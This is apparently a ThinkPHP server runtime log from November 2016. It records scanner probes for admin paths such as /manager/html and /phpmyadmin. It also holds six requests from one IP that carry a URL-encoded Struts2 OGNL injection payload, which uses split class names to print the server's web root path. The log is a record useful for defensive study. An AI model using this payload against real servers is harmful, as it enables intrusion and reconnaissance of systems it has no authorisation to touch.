[ 2016-11-29T00:35:02+08:00 ] 121.18.231.88 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000077s ]
ERR: 无法加载模块:Manager

[ 2016-11-29T00:58:05+08:00 ] 222.209.111.142 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: 无法加载模块:Manager

[ 2016-11-29T01:30:48+08:00 ] 113.195.188.14 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000124s ]
ERR: 无法加载模块:Manager

[ 2016-11-29T06:09:53+08:00 ] 118.130.137.38 /login/Jeecms.do?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000095s ]
ERR: 无法加载模块:Login

[ 2016-11-29T06:09:53+08:00 ] 118.130.137.38 /loginAction.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: 无法加载模块:LoginAction

[ 2016-11-29T06:09:53+08:00 ] 118.130.137.38 /login.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: 无法加载模块:Login

[ 2016-11-29T06:09:55+08:00 ] 118.130.137.38 /index.do?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: 无法加载模块:Index

[ 2016-11-29T06:09:55+08:00 ] 118.130.137.38 /admin/loginAction.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: 无法加载模块:Admin

[ 2016-11-29T06:09:55+08:00 ] 118.130.137.38 /index.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: 无法加载模块:Index

[ 2016-11-29T09:04:15+08:00 ] 80.82.78.38 /cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000117s ]

[ 2016-11-29T09:54:43+08:00 ] 66.102.6.10 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000105s ]

[ 2016-11-29T10:06:06+08:00 ] 222.187.223.175 /phpmyadmin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: 无法加载模块:Phpmyadmin

[ 2016-11-29T11:14:23+08:00 ] 171.208.78.140 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: 无法加载模块:Manager

[ 2016-11-29T15:23:39+08:00 ] 222.187.223.175 /phpmyadmin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000077s ]
ERR: 无法加载模块:Phpmyadmin

[ 2016-11-29T16:48:54+08:00 ] 112.65.193.13 /editors/index.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: 无法加载模块:Editors

[ 2016-11-29T19:03:31+08:00 ] 222.186.130.194 /phpmyadmin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: 无法加载模块:Phpmyadmin

[ 2016-11-29T19:03:53+08:00 ] 222.186.130.194 /phpmyadmin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000099s ]
ERR: 无法加载模块:Phpmyadmin

[ 2016-11-29T19:29:27+08:00 ] 172.82.166.210 /cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000099s ]

[ 2016-11-29T19:56:15+08:00 ] 101.94.208.205 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
INFO: [ app_init ] --END-- [ RunTime:0.000133s ]

[ 2016-11-29T21:37:18+08:00 ] 219.133.49.231 /proxy.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: 无法加载模块:Proxy

